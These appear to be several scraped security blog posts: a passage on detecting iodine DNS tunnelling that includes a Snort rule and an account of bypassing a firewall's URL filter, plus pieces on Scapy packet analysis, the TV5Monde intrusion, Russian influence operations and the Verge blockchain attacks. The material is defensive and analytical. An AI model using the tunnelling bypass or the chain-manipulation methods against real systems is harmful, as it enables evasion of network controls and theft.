1. Detection of known malicious domains:
This is done by analyzing the DNS queries from your network and if one of them is for a known bad domain, it is dropped.
The easiest way to implement this is by using a public DNS resolver that provides a layer of security. Free examples of this are Cloudfare (just check you’re not using 1.1.1.1 in your network…), or OpenDNS (free for home use). Enterprise solutions include some of the Infoblox products or Cisco Umbrella to name the most common ones.
Alternatively some firewalls provide URL security and might be able to block known domains.
For this method you are relying on a blacklist of known malicious domains, so if you are victim of a targeted or small scale attack, chances are this is going to be useless.
2. Traffic Analysis:
More of a reactive measure, however if we have an idea of the average DNS requests in your network or hosts you should be able to detect when there is a sudden increase in DNS activity.
Again, there are many tools you can use for this. From firewalls that have application visibility (most NGFW should do this), network flow analysis tools, or dedicated DNS security appliances like the ones from Infoblox.
3. Intrusion Prevention Systems:
Some IPS systems such as Snort will include detect packets unique to iodine:
# alert udp $EXTERNAL_NET 53 -> $HOME_NET any (msg:”APP-DETECT iodine dns tunnelling handshake server ACK”; flow:to_client; byte_test:1,&,0x80,2; content:”|00 01 00 01 00|”; depth:5; offset:4; content:”v”; within:1; distance:4; content:”VACK”; within:200; fast_pattern; metadata:service dns; reference:url,code.kryo.se/iodine/README.html; classtype:policy-violation; sid:27046; rev:2;)
Some other more generic rules will detect long URLs in DNS requests, these rules that can easily be bypassed by shortening the payload in every request (although slowing down the tunnel speed).
During my Iodine deployment I was sending all traffic through a Palo Alto Networks firewall in my environment. The plan was to play first the attacker role and later the defender.
First I configured a basic URL filtering rule to block social network websites:
In seconds I established my DNS tunnel… and it worked! Soon I was loading Facebook.
I was surprised on how easy it was to bypass the URL filtering engine, and then I proceeded to switch teams and see how could I block this.
The starting point would be traffic analysis, I expected a big amount of DNS traffic and then some convoluted solution to block sudden changes in traffic patterns.
However this is what I found to my surprise:
The firewall was detecting that I was sending TCP traffic over DNS. But how?
Clicking on the application details I could see the following:
It looks like the application detection engine detects traffic from most DNS tunneling tools, in a similar way as we saw that Snort has a couple of rules to detect Iodine traffic, and puts them under the same category.
Grouping all these types of apps into one application group makes it more easy to manage than having a single Snort alert.
Let’s create a rule now that will block these type of applications:
Easy! Let’s see if it works:
First we run Iodine…
Job’s done! Our network should now be secured against most DNS tunneling attacks.
To simulate a true real world scenario I should switch sides again and try to bypass again this firewall but being honest, that would be way more complex.
Remember to always test your defenses, at least before this dude does:
Did you enjoy this post? Hit that clap button! � You can clap up to 50 times on the same article… Try it if you don’t believe me :)
Anything you didn’t like? Please tell me why!
Written by
","['Hacking', 'Cybersecurity', 'Tutorial', 'Technology', 'Infosec']"
Learning Packet Analysis with Data Science - SecDevOps,https://secdevops.ai/learning-packet-analysis-with-data-science-5356a3340d4e?source=tag_archive---------7-----------------------,"Have you ever opened Wireshark and thought, “this is nice, but sometimes filtering and following TCP streams is tedious?” If not, open Wireshark more. In this post, I’ll cover how to leverage Python, Scapy, Pandas, and Seaborn to bring excitement back to packet analysis. Also, this post will serve as a prequel for our next series on Packet Manipulation with Data Science.
The short answer is, Yes. We’re living in a time where both the cybersecurity analyst and researcher are losing their technical edge by relying on far too many closed-source tools. Combining Python and Data Science enables anyone to reach new realms of possibilities in cybersecurity. Not only will it give you the ability to manipulate data, you can begin creating custom visualizations with the data that you’ve manipulated.
If you haven’t gotten around to using Jupyter Notebook, please start today — This should serve as your playground for executing and bringing ideas to life. We’ll also leverage Anaconda as our package manager to make our lives simple while creating our development environment:
Steps:
If you’re interested in following along with a Docker image, follow this link: https://github.com/secdevopsai/Packet-Analytics
There’s a few libraries that we’ll need to import to make all of this possible. Take a look at the gist below:
Scapy is a powerful tool that will give us the ability to capture, load, and save packets. Scapy is my packet capture tool of choice because of it’s extensibility and ongoing community support. Typically, packet capture and/or analysis is performed in Wireshark. It’s tough to keep track of multiple suspicious indicators in Wireshark while also keeping track of multiple connections. I’ve also witnessed attempts and efforts to store packet captures in Splunk and other Search Engines — This is not a cheap solution and does not solve the problem of analysis. When manipulating packets in Scapy, operations can seem a bit rigid. Transforming our packet capture into a Pandas DataFrame will make our lives a lot easier.
Sniffing packets in scapy is a straightforward process. We have the option to define a finite numbers of packets to sniff.
For the sake of this post, I’ve created a PCAP with a seemingly suspicious stream. We’ll append the suspicious PCAP to what we’ve already collected
When enumerating through the collected PCAP (PacketList Object), we can observe encapsulation of network layers. More specifically, pcap[101]’s first layer is Ethernet -> which has a payload (IP) -> Which has a payload (UDP). It’s important to understand encapsulation because data can be communicated via tunneling protocol (MPLS, GRE, ect..)
If you’ve searched “Python Data Science” on Google then you’ve surely come across Pandas. This is an astounding tool to leverage when attempting to manipulate various data types. From Pandas, we’ll be leveraging DataFrames — two dimensional data structures. We’ll convert boring Scapy output to a more comprehensive DataFrame:
The below code snippet is important but can be skipped. The key takeaway of the code snippet is that we’re enumerating through the encapsulated network layers and creating a DataFrame that will have encapsulated layer fields as columns (ie. Source Address, Source Port, ect…)
There are many amazing DataFrame introduction posts that can be found here and here. The below snippet has some DataFrame Basics to keep in your back pocket:
When dealing with suspicious, you don’t want to spend countless hours on determining if something is malicious or benign. We can leverage our DataFrame and gather quite a bit of statistics on what is encompassed in our PCAP. In this example, we’re going to retrieve the most frequent source address, destination address and some information about the ports that are being utilized in network communications:
When dealing with large quantities of packets, creating visualizations in the form of graphs can be quite helpful for understanding trends and patterns. We can leverage matplotlib, seaborn, or other libraries such as plotly to visualize our data. When searching for malicious artifacts in PCAP graphs can highlight anomalous spikes of data and display that data is being sent out in regular intervals (or pseudorandom intervals). In the below snippet, we begin applying grouping operations — Grouping data by Destination Address and other attributes:
The graphs that we created highlighted the fact that a large amount of data was sent over port 53. Exfiltrating data using this port is a common technique for attackers due to the fact that restricting DNS communication can be troublesome. At this point, we can open wireshark or write a few lines of code to make this action repeatable. We’ll perform another grouping operation, separate the conversation into its own dataframe, and view the suspicious conversation:
Working with PCAP can sometimes be tedious and intimidating. By leveraging Python and Data Science techniques we can begin to glean out more interesting attributes and find the suspicious or malicious data that we’re searching for quickly. By using these techniques we’re only scratching the surface of possibilities and with practice you’ll begin to find many artifacts in your packet streams. My challenge to the reader is to fully extract the PNG from the PCAP and display the image.
Link to Github Project: https://github.com/secdevopsai/Packet-Analytics
Written by
","['Cybersecurity', 'Development', 'DevOps', 'Artificial Intelligence', 'here', 'Here', 'Slack', 'YouTube', 'Twitter', 'Reddit', 'Facebook', 'Data Science', 'Cybersecurity', 'Python', 'Technology', 'Programming']"
Lessons from TV5Monde 2015 Hack - Comae Technologies,https://blog.comae.io/lessons-from-tv5monde-2015-hack-c4d62f07849d?source=tag_archive---------8-----------------------,"This week during the SSTIC2017 annual cyber security conference, a French conference running consecutively since 2004, the National Cybersecurity Agency of France (ANSSI) gave a presentation detailing their 2015 audit of their investigation and remediation of the intrusion which affected TV5Monde television network channel. This intrusion was allegedly conducted by the Fancy Bear/APT28 actor, and resulted into broadcasting and social media sabotage.
Although, this happened two years ago — hats off to both ANSSI and TV5Monde for sharing their experience, what they have learned and their methodology during the investigation. Very few companies understand the importance of sharing such information in order to prevent similar scenarios. This sort of feedback is incredibly valuable and informative for the community. Thanks.
You can find the original video online but since it is in French, I decided to make a quick transcription of the main lessons and points from the presentation including some personal notes on the incident.
The first artifact detected was the presence of an Administrator account with an English username — which was very surprising for the auditors given the fact the whole Active Directory was in French.
This account allowed to taint a machine, and to retrieve initial timestamp information.
This also allowed to identify a suspicious DLL (ConnectBack.DLL is an arbitrary name) on the active malicious session ran by rundll32.exe and C&C IP. This malicious DLL can then be analyzed to understand in depth what the malware is doing but also identify code similarities with other malwares.
9 April 2015 — Beginning of the incident response and remediation.
ANSSI describes they collected ~300GB of compressed logs for network logs (TACACS), Internal wiki logs (Apache logs), Firewall logs (ASA), Windows logs (Active Directory, Desktops & Servers) — in addition of ~13TB copy images of harddisk, memory (RAM) and embedded devices of the main target of interests.
ANSSI rightly focuses on the importance of the logs collection but also on memory forensics part which is very important in such scenarios to keep a frozen state of the infected or machines of interested but easily allows to retrieve information such as the quick-wins described above.
This is why at Comae we decided to build and we are currently working (& still looking for beta testers to improve it!) a comprehensive and scalable platform such as Stardust for memory forensics for incident response & compromise assessment.
Multiple parties (TV5Monde, French Ministry of Interior, ANSSI, ENISA, and other television networks) were involved. Each involved party had different goals and expectations.
TV5Monde
French Ministry of Interior
ANSSI
Partners (ENISA) & Television Networks
The attacker got his initial access the network on the 23rd January 2015 and explored it over multiple weeks.
One of TV5Monde multimedia server (used by journalists to send content back) had its RDP port exposed to internet and was using default username/password. But this machine was not connected to the internal network, and was quickly classified as dead-end by the attacker.
The attacker came back later on, this time, with a compromised third-party account to connect through the TV5Monde VPN before compromising it on the 6th February 2015 over a one week period, and discovered two machines (ROB1 & ROB2), after scanning its internal network, that were Windows machines managing the cameras.
The attacker used one of these compromised machines (ROB2) to create a new Active Directory Administrator user (LocalAdministator) (11th February)
During the 16th February to 25th March 2015 period, the attacker searched (“telnet”, “ssh”, “video”, “compte”, “pass”, “VPN”, etc.) & collected data on the various internal platform such as the IT Internal Wiki and retrieved as much login and password information as possible and also spend the time to verify those information to make sure they were not expired or outdated.
The attacker compromised another administrator machine (Codenamed: ANKOU) which contains the Remote Access Control (RAT) which was used for the sabotage. Prior to this, the attacker also dropped njRAT as a decoy on the system but didn’t run it — ANSSI isn’t sure why.
Social media accounts got compromised few hours before the sabotage of the broadcasting network.
As we can see from the above information, the attacker was in the network for almost 3 months and carefully prepared his sabotage operation by verifying the collected information.
At 19:57, the attacker did his first damaging operation by faulty re-configuring all the IP configuration of the media encoded. This misconfiguration only gets enabled when the technical teams reboot the machines.
At 20:58, the online presence is affected through social media accounts (YouTube, Facebook, Twitter) and the website of TV5Monde which is modified.
At 21:48, the attacker runs a series of destructive commands (extracted from TACACS logs) to erase the firmwares from the switches and routers that results into the black screens — except for one new channel that was launched on the same day which was covering the attack from inside.
Having centralized logs make the incident response step easier — and results in better quality analysis.
ANSSI also noted that TV5Monde very understanding of the importance of logs, which is not always the case of compromised companies. This is an incident response, therefore it is very important to be able to analyze all the logs to not miss anything but also be as quick and efficient as possible.
In the case of TV5Monde, ANSSI emphasized they had access to good quality logs.
Outsourcing means it is very difficult to have enough the information required to take decisions — including re-configuring, collecting logs, isolating and take urgent decisions by yourself.
Why is it important ? Because this add a considerable delay between the time to decision and action — which is critical in such scenarios.
The Active Directory was composed of around:
As you can see from the above screenshots limited the admin access, removing the unused support accounts and building a comprehensive AD is critical — but also documenting it to be able to keep track of its modification for the future too.
Sean Metcalf wrote a blogpost describing how to scan your Active Directory to detect priviledged accounts efficiently using PowerView from Will Schroeder.
As part of the remediation, ANSSI also did a great work of Active Directory hardening focusing as you can see on the above screenshots on:
This makes sense but who knows, you want to avoid the account and machine administrating your hypervisor and domain controller to browse unnecessary websites to not increase your attack surface.
Unfortunately, too often many CIOs don’t know exactly what applications are actually being used by their users — having worked on an application deployment solution (acquired and rebranded as VMware AppVolumes) we often bumped into that problem.
You don’t want your attacker to end up with a better documentation than your CIO.
This will also save a lot of time to both the investigators and your organization when it comes to understanding the potential attack vectors, what happened but also taking decision (cf. #1). Unfortunately, most of companies have difficulties understanding this — and often have a flawed view of what their internal IT really looks like.
Not a secret, you should test your own applications and network before an uninvited guest does it for you. According to Microsoft Advanced Threat Analysis Team, 146 is the median number of days an attacker resides within a network before detection.
If you already have trusted partners who know you — this will obviously make you better prepared and you won’t have to wait for quotes for days.
But something which was surprising was the fact the journalists themselves were so focused on the story they often prevented the incident responders to do their jobs — the speaker even mentioned they are to run away from the journalists, they got interrupted many times and got followed by cameras which was against their own interest.
Thanks to @SwitHak for bringing my attention on this presentation.
Congratulations again to the ANSSI Team for conducting the analysis and assisting in the Active Directory migration/remediation. Thanks again to TV5Monde & ANSSI for sharing those information with the public.
I personally think this shows great technical leadership from both of them, and I hope this will encourage more parties to mature their cyber security practices and do the same.
Information sharing is critical. This allow companies but also security experts to learn & understand to better analyze and prevent incidents.
Written by
","['Products', 'Labs', 'Events', 'Hire Comae', 'Shadowing', 'Microsoft', 'Cybersecurity', 'Television', 'France', 'Russian Hacking']"
Lessons in Cyber: Influence Operations - Comae Technologies,https://blog.comae.io/lessons-in-cyber-influence-operations-33da4769f0c2?source=tag_archive---------8-----------------------,"International, and US, cyber wonks seem to have caught the influence op bug. Starting with the slow dawning awareness that PSYOPS can be conducted using New Media companies (Facebook, Twitter, Instagram, YouTube, etc.) the fascination with information/influence/psychological ops is exploding. Typically this is done with a hyperbolic discussion about the threat to liberal democracy represented by “people lying on the Internet.” Apparently the events in Ukraine (2014–2018) and the 2016 US election have finally reached critical mass and now every newly minted cyber expert is an information warfare specialist. Heads firmly stuck in the last lost war, they have just been caught slipping, again.
Rather than rehash what I wrote about in 2016 and 2017, lets look at an influence operation that is happening in 2018. Russia, having been caught conducting PSYOPS against the US in 2016, is leaning in and now pushing to establish itself as a recognized cyber superpower. Although there is room for debate about how true that is across all dimensions of cyber power, there is little doubt that they’re firmly the masters of mind games.
With a rich history of flexible approaches to the truth and numerous successful intelligence operations over the last century, their ability to conduct effective information operations should really come as no surprise. The surprise is how fertile the West has become for these games, it has squandered the inherent resistance to info war that sustained them through the Cold War — a virtual monopoly on the truth. The ramifications of dissolution of the USIA are now apparent. Charles Wick’s understanding of disinformation is sorely missed.
In responding to disinformation, the United States has the tremendous advantage that the truth is inherently more powerful than lies. But if the lies go unchallenged, then they can have a damaging effect.
— Charles Wick. Source
[W]ith all disinformation…it is the repetition that creates perceptions that then harden into damaging assessments — Charles Wick. Source
Cyber has become a good domain to demonstrate international prominence. It is no longer feasible to set off a Tzar Bomba or atomize islands in the Pacific, but parading nation state capabilities on the world stage is still possible. The trick is to keep it below the threshold of kinetic retaliation.
The malware used against the 2018 Winter Olympics was poor quality, and badly false flagged. The interruptions to the Games were minimal. The attack was announced beforehand by Russian linked hackers. There is a reason for this — the operation was not about the actual action, the spoiler effects of the attack, but rather the inevitable discovery and media attention. The objective was not to disrupt the Games, but to amplify the image of Russia as a cyber superpower and provide a future credible belief in false-flag cyber ops. This will likely be used in future information operations to confuse and reduce the belief in the accuracy of attributions. Two very useful objectives that rely entirely on the Intelligence Services and the international media reacting in a particular way.
That gamble has paid off. Something like this just happened.
Establishing a position as a cyber-superpower is costly, resource intensive, and requires some level of public exposure. Of course, public exposure of cyber capability is a great way to lose that capability, so there are risks involved. Israel’s Unit 8200, the UK’s GCHQ, the US NSA, have firmly established themselves as cyber superpowers via publicity (in the latter case, reluctantly, thanks to Stuxnet and Edward Snowden.) China was annointed by the APT1 paper as a cyber power. Russia has long held the role of cybercrime haven, but has only slowly gained recognition for their cyber espionage campaigns. The recent focus on cyber influence ops, fixated on false narratives spread through media channels, in particular the revelation of active — successful — operations against the UK and the US (both recognised cyber superpowers) has greatly improved Russia’s international standing as a dominant cyber power.
It is worth noting that cyber capacity and capability have a huge amount of complexity and dimensions. There is
Naturally, these can be combined, and typically are. For example, the Stuxnet attack involved a kinetic cyber attack against the Siemens controllers of the Iranian centrifuges, while also presenting an informatic attack by displaying false “normal” status reports to the operators.
There are fundamental reasons why most countries focus on passive or kinetic cyber as the ultimate tier of capability — typically the organizations with authority to engage in cyber are the Intelligence Services and the Military. They are institutionally predisposed to collecting data or conducting “deny, disrupt, destroy, degrade” operations to enable and support their forces. This tunnel vision is a problem, but further hindering them is poor adaptability, slow speed, reduced creativity, and limited agility.
These organisations are hierarchical bureacracies, and achieving tight OODA loops requires pushing authority down to the operational level. This functions best with capable operators and operations managers. As a result, small teams are therefore frequently more capable than large teams, a sort of mashup of Conway’s Law:
organizations which design systems … are constrained to produce designs which are copies of the communication structures of these organizations.
and Brook’s Law:
adding human resources to a late software project makes it later
Which leads to a significant advantage that Russia has inherited/created for itself in the cyber arena. There are a lot of small groups and the Intelligence Services have deliberately created the bureaucratic space to allow their cyber teams to operate at a high speed (conception to execution), and a high tempo (frequency of operations.)
They have also demonstrated exceptional creativity, which is a result of diversity and competition: numerous small teams (more ideas, less group think); a rich history of information operations (over a century of uninterrupted institutional memory); a deep cultural malleability with the truth (exhibit A, Pravda); and, an environment with the freedom to fail. Failure is an option. This encourages risk taking. As a result, it is possible to use a “spaghetti at the wall” approach — throw a bunch of operations at the wall and see what sticks.
The combination of adaptability, speed, agility, diversity, competition, creativity, and risk tolerance results in a exceptionally vibrant and subtle cyber capacity. Whether it is cohesive enough to conduct the sort of operations that the West thinks about is an open question, but it is undeniably able to conduct operations that the West does not think about — and, possibly, that is more important.
In the middle of the Western re-discovery of PSYOPS (they literally wrote the book on this in the 1970s, and updated it a couple times since), Russia has again executed an information warfare attack. They have accepted the (honestly Russophobic) “cyber power” frenzy and are leaning in, pushing it further. They have done this on the cheap, and it is seriously impressive to witness it happening literally in the middle of the “Russia cyber influence” frenzy. As I’ve said before, cyber conflict is like Calvinball, the only rule is that it isn’t played the same way twice.
The start of the 2018 Winter Olympic games in South Korea were marred by some malware induced problems. The geopolitics at the time involves fear about North Korean cyber capacity (they’re aggressive), sabre rattling about nuclear war, and Russia being banned from participating due to a doping scandal. This latter is what matters in this case as they are essentially the only nation state with a motive for interfering with the Games. They also have a history of provocations around doping and the Olympics, again dating back to 2016 and the WADA hackers who operated under the moniker “Fancy Bear Crew” — itself an info war attack aimed at causing confusion with the CrowdStrike naming convention for the GRU cyber team involved in the 2016 election.
In early 2018 the WADA hacker Twitter became active again, threatening to interfere with the Olympic games. This caused some minor media attention, but was not a particularly big deal. Then the malware and trivial computer problems during the start of the Olympics caught some media attention, but given the minimal disruption and the vague attribution (“was it kiddies for the lulz? DPRK as spoilers? Russia?”) there simply wasn’t that much of a story there. A week later something critical happened. The US came forward and specifically attributed the attacks to Russia stating that they had conducted a false-flag operation made to appear as North Korea. Now this is a story with legs.
Russia has caused the international media to trumpet its cyber superpower status. Additionally, not only was this an effective influence operation that caused Russia’s cyber power status to grow in stature and mindshare, the use of a false flag operation has laid the groundwork for future information warfare attacks. By acknowledging that a legitimate, serious, for real, false flag cyber operation occurred, the US intelligence community has created fodder for future conspiracy theories and contrarian attributions regarding cyber attacks. When an attack is publicly attributed to Russia, trolls and other info war participants will be able to point at this false flag operation and raise doubts about future attributions.
In one, cheap, operation they have amplified the concept of “Russia the cyber superpower”, and establish a plausible argument to dispute the credibility of future attributions. The creativity of this operation is not to be denied. Absolutely stellar. For the price of some cheap malware, a few Tweets, some playful shenanigans, and then simply sitting back to wait for the operation to be exposed and covered by the international press, Russia has achieved two important objectives:
Truly impressive PSYOPS. Russia takes home the cyber gold for this Olympics.
Written by
","['Products', 'Labs', 'Events', 'Hire Comae', 'reflexive control', 'Cybersecurity', 'Olympics', 'Operational Security', 'Cyber', 'Infosec']"
"Let’s Do the Time Warp Again: The Verge Hack, Part Deux",https://blog.theabacus.io/lets-do-the-time-warp-again-the-verge-hack-part-deux-c6396ab36ecb?source=tag_archive---------6-----------------------,"The pitfalls of Frankenstein codebases, whether “size matters” wrt blockchains, why inadequately fixing broken things is a bad idea, and a plea against blind, tribalistic crypto-shilling — plus colorful charts and graphs!
Note: This is a follow-up post; you may want to first read part 1 here.
If you want to scare somebody in the cryptocurrency world, just utter the phrase “51% attack.” This method of network assault — in which a single party manages to acquire enough mining power to outperform the joint forces of the rest of the network — can no longer be written off as an unfeasible hypothetical, at least not for smaller-scale altcoins [1]. Bitcoin Gold and Monacoin were both recently hit with such an an attack, and it seems inevitable that more will soon follow.
As far as these attacks go, however, there are important distinctions to note: when Verge was attacked at the beginning of April, it was widely reported as being in the 51% category. However, as I explained in part 1, a combination of questionable design decisions and outright mistakes in Verge’s software enabled the attacker to pull off their feat with far less than the majority of the hash-power, making the “51%” label wrong, or at best misleading [2].
Well, as it so happens, on 5/22, Verge was attacked again. From the outside, the attack looked suspiciously similar to the first, which was odd. Surely, in the six-week interval between attacks, some sort of fix must have been implemented that would at least make the attacker’s life more complicated. Right? Perhaps this time, it was a legitimate 51% attack? Or maybe the attacker found some new, clever, fascinating, heretofore unfathomed security hole to exploit? I was curious to know the details, and many others seemed to be as well, so I decided to dig back in.
Here’s a drastically condensed version of what I discovered:
Why The Second Hack Looks Just Like The First (With One Insignificant, and Disappointingly Uninteresting Difference)
The first time around, I explained how the mining exploit was made possible by two aspects of Verge’s design: a high permitted time-drift window that allows throttling of difficulty, and the use of five independent mining algorithms, which makes difficulty throttling a far more serious problem.
After a few fits and starts (more on that later), the Verge devs ultimately implemented a patch that involves making the five mining algorithms a tad less independent (while leaving timestamp issues and difficulty adjustment untouched [3]):
In English: “when you give me a block mined with algorithm x, I look at the previous 10 blocks, and if at least 5 of them were also mined with algorithm x, I reject your block.” This very directly prevents all blocks from being mined with a single algorithm for any significant amount of time. The idea, presumably, was that since one algorithm dominated the whole network last time, explicitly preventing that particular case should be enough to thwart future attacks.
A minor objection one could raise: keeping the algorithms completely independent actually makes economic sense, and thus, imposing this limitation is bound to have some unintended consequences. If difficulty is low enough for more than five of ten consecutive blocks to be mined with one algorithm, preventing this from happening also prevents retargeting from smoothly hitting equilibrium. Abrupt peaks and valleys in difficulty will likely occur.
…A major objection one could raise: as some keen observers were quick to point out, this patch does little to actually fix the vulnerability; the attack vectors basically remain wide open.
As a purely speculative and hypothetical example: imagine that the attacker can amass enough hash-power to overwhelm the network for two of Verge’s allotted mining algorithms, instead of just one. At absolute best, this would make the attack roughly twice as expensive; given how shockingly cheap it has become to rent computational mining power, this may amount to no more than a trifling inconvenience. In either case, “this will be a bit more costly to pull off a second time” isn’t exactly a comforting phrase in the world of cybersecurity.
Once the dominant hash rate on two algorithms is achieved, our totally imaginary, speculative attacker could simply repeat the early April attack, but instead of mining all of the blocks with one algorithm, just alternate between the two in intervals of five blocks at a time.
Well, wouldn’tcha know:
So that’s pretty much that.
The Bigger, More Interesting Issue
So going back to the aftermath of the first attack: some curious observers at the time wondered how and why it actually came to be that Verge would have a 30 minute difficulty adjustment window while allowing a time drift of two hours. It’s clearly a mistake, but an error this egregious begs for some sort of explanation. One can’t ever claim absolute certainty of the sources of others’ blunders, but in this case, there does appear to be a highly probable culprit: Verge copied portions of their code from another project, Peercoin, and in doing so, accidentally inherited the other coin’s two-hour time drift (two hours is an appropriate time drift for Peercoin, given its much larger block times and difficulty adjustment window relative to Verge’s [4].)
Before going any further, it’s worth making something explicitly clear here: I am not claiming there is anything wrong with copying code from an open source project. Indeed, making a project open-source is an inherent invitation for others to freely draw from it. Reusing others’ code is a part of being a developer. If I were forbidden from copying and pasting others’ solutions from stackoverflow.com, I wouldn’t be able to pay my rent.
However, there is something very wrong with reusing code for a high-stakes project without understanding the implications it will have in your software. Different projects, even those with many superficial similarities, involve different design decisions and require different security considerations. If you’re patching together software from different sources (in the case of Verge, they appear to draw from Peercoin, Shield, Dogecoin, and Fantom, among others), failure to understand the implications of even a single numerical constant can (and indeed did) result in catastrophe.
So anyway, yes, odds are that that’s how the two-hour drift value snuck in. But that, in and of itself, isn’t particularly noteworthy. Bad code does as bad code does, regardless of where it came from. The reason I’ve bothered bringing all of this up is because, when one goes down the rabbit-hole of investigating what else Verge inherited from Peercoin, a new, alarming issue comes to light.
First, to the whiteboard:
Longest Vs. Strongest Chain
You’re a blockchain protocol: how do you determine if a chain is valid? This, in a sense, is actually pretty straightforward: in short, you look at it. The data is all saved on a public ledger, so you can just explicitly check that all state-transition rules are being properly abided by (if Alice pays Bob, Alice cryptographically verified that she actually has that money; nobody created new money out of thin air; things like that.)
Okay, but this is an open protocol, so what if there are two different chains given to you, and both of them are valid? Which one do you pick as the canonical record? Ultimately, one has to be chosen. We can only have one version of history; that money has to belong to somebody.
This is a stranger problem that requires a more novel solution, a solution which Satoshi provided: for a block of transactions to be considered valid, the block has to be mined, a computational process that involves consuming a non-trivial amount of energy. Then, if two competing valid chains are presented, the protocol selects whichever one has had the most mining work invested in its creation. Thus, as time goes on, it becomes increasingly costly for multiple chains to coexist, thereby increasingly incentivizing the network to come to consensus.
Now you’ll often hear “longest chain” as the shorthand for “chain with the most work” (aka “strongest chain”). But if we take “longest chain” to mean “the chain with most blocks,” there’s a subtle but important difference between these two notions. For the simple reason that mining difficulty can change over time (as Verge has so nicely illustrated for us), the longest and strongest chain need not necessarily be one and the same; three low-difficulty blocks may take less hash-power to mine than one higher-difficulty block, for example. Thus, there will be edge-cases when simply accepting the longest chain would compromise the security of the system.
Interestedly, this distinction appears to have initially been missed by Satoshi himself; the early implementations of Bitcoin went with the longest-chain rule before this was surreptitiously updated. Since then, using the strongest-chain rule has become the standard for proof of work coins, and rightfully so.
Now Peercoin, however, still does use the longest-chain policy, but for them this makes perfect sense; Peercoin’s consensus protocol uses proof of stake instead of proof of work. Blocks aren’t mined, but rather, are voted on by nodes with currency locked into the system. The important point here being that unlike blocks in proof of work systems, Peercoin’s blocks don’t have “weight” in any sense. Things are binary — a given block is either accepted or rejected. Thus, when selecting between two competing chains, it’s a perfectly sensible approach for Peercoin to simply count the blocks and select the longest one.
But Verge does use proof of work, and thus blocks do have their own difficulty-weight, and yet, unlike virtually every other proof-of-work based coin, they use the longest-chain, not strongest chain policy. Why?
It sure looks like it’s same reason that they ended up with a two hour time drift: they got it from Peercoin without realizing the risk it imposed. I.e., they messed up.
Implications for Attackers
Okay, so the canonical Verge chain is the one with the most blocks, which is not necessarily the one that requires the most work. How can our enterprising attacker best exploit this situation?
Here’s one way: the attacker picks a block at which to start his attack. When this block arrives, he starts mining “in the dark”; i.e., he doesn’t accept anyone else’s blocks, and he doesn’t try to broadcast any blocks he finds to the rest of the network, effectively creating his own, personal chain.
His goal is to build this chain out to the point that it’s longer than the network’s. This would normally be a daunting task, since he’s competing against the rest of the network as a whole, which, one presumes, is a lot of hash-power to race against. However, as loyal readers know from part one, our attacker can gradually decrease mining difficulty. And note that now, since his chain is “personal” and still not getting broadcast, this difficulty decrease only applies to himself, not to any other miners. As his difficulty decreases, his blocks-mined-per-second rate increases, and thus, it’s just a matter of time before his chain becomes longer than the network’s (since he’s forging timestamps anyway, the amount of time it actually takes for him to catch up is basically immaterial.)
At this point, the attacker broadcasts his new branch far and wide, which the rest of the network obligingly accepts. So NOW, to maintain network dominance, he just has to make sure his chain stays the longest. In theory, another miner could outpace and thwart him, but the situation he’s in gives him three inherent, additional advantages:
So there you have it; add the ill-advised use of longest-chain selection to the list of issues. And note that as of writing, the chain selection code still has yet to be modified.
The Second Fix
So what has been changed then? We already covered the fix following the first hack; after the second hack, they finally lowered the time drift window from two hours down to 10 minutes. Whether 10 minutes is the appropriate drift is something I can’t claim to be qualified to answer. What I can confirm is that a third attack was clearly attempted on 5/29; the attacker was able to repeatedly create difficulty valleys, though he never did dominate the whole network this time:
In any case, one could be forgiven for wondering why it took six weeks (and another hack) for this simple, obvious change to be made, which brings us to the “fits and starts” alluded to earlier. While patching the first hack, they seem to have initially wanted to decrease the time drift to 15 minutes, but things kept… going wrong. First, they failed to convert 15 minutes into seconds, then they failed to convert 15 minutes into seconds again, then realizing that changing the time drift rules had retroactively made old blocks invalid and thus forced a hard fork in the chain, they made sure the rule only applied after a certain block (and alerted all clients that they had to immediately update again), until finally, they reverted all time-drift changes they’d made altogether and went with the “5 out of 10” patch described above.
After going through all of this riffraff, why did the time-drift fix end up getting ditched anyway? Perhaps they really thought that the “5 out of 10” patch would be enough; what this commit message seems to imply is that they simply forgot. Frankly, I’m not sure which is worse.
As for what will happen moving forward: in April, they indicated that they were working on a “a whole new method for block and transaction verification.” More recently, they’ve said that they are working on rebuilding the project in a new repository (which is private, as of writing), where they’ll be rebasing their code into that of Bitcoin core. So I suppose we’ll see how that goes.
Final Thoughts/FUD
What can I possibly say here? When I started investigating Verge, it was purely out of intrigue and curiosity about how such a hack could be accomplished. I truly had no interest in attacking the developers or the community of users, or in casting the project in a bad light. So, at the risk of putting the cart before the horse, I want to preempt any possible accusations impugning my motives, and make this crystal clear: this time, I am trying to spread FUD [7]. Sometimes, fear, uncertainty, and doubt are reasonable responses to a situation, and if you have any sort of investment in the success of Verge, and aren’t experiencing some combination of those three emotions, I can only conclude that you’re lying to yourself or aren’t paying attention.
Because there’s just no way around it — this shit is inexcusable. This level of irresponsible negligence would be deemed unacceptable in an undergraduate’s comp-sci 101 midterm project, let alone a project giving rise to a digital asset worth (by at least one metric) hundreds of millions of dollars.
Trust-minimized systems will always still have certain parties granted some degree of good-faith, and like it or not, programmers are inevitably one of those parties. Having specialized skills and knowledge makes them sort of pseudo-fiduciaries, and the only way to keep such actors honest is to hold their feet to the fire at all times and demand explanations when things go awry.
Instead, what we see in all too many of these crypto-communities (and no, I’m certainly not only talking about the #VergeFam here) are armies of cheerleading sycophants who seem to have actually convinced themselves that if they can maintain constant levels of hyper-jubilance about their project and confront any criticism by slandering and shaming it out of existence, then the ensuing hype-bubble they create and the accompanying value increase of their precious coins will be enough for them to retire on.
Well, this is what you get. You get a team that’s off issuing press releases about the latest big-name partnerships while technical issues that require only a basic understanding of cryptocurrency protocols and a few man-hours to fix sit exposed for some psychotically-focused hacker to have his way with. And until somebody decides to pressure somebody else to do some form of due diligence, it’ll just keep happening.
Because as far as Verge is concerned, I’m afraid the unavoidable conclusion is that this hacker is currently doing better due diligence on this codebase than the Verge Developers themselves. I’d poach him if I were them.
For inquiries: daniel@theabacus.io
Notes:
[1] Some bitcoin maximalist-types have a less dignified term for “smaller altcoins” that I myself am far too classy to use here.
[2] Whether the actual situation was better or worse than a 51% attack is really a matter of opinion; I’d argue for a lot worse.
[3] For the developers/ nit-pickers, here’s he commit in question. To save you some time and heartache: while the diff appears to show to timestamp drifting, these changes are actually just reverting other post-hack patches from prior commits; so indeed, no changes were ultimately made to timestamp logic.
[4] The lead dev seems to acknowledge this here, linking to the Peercoin constants page without explanation.
[5] There is no protocol rule preventing this since generally it’s in the miners’ best interests to include as many transactions as possible (for maximum fee-collection).
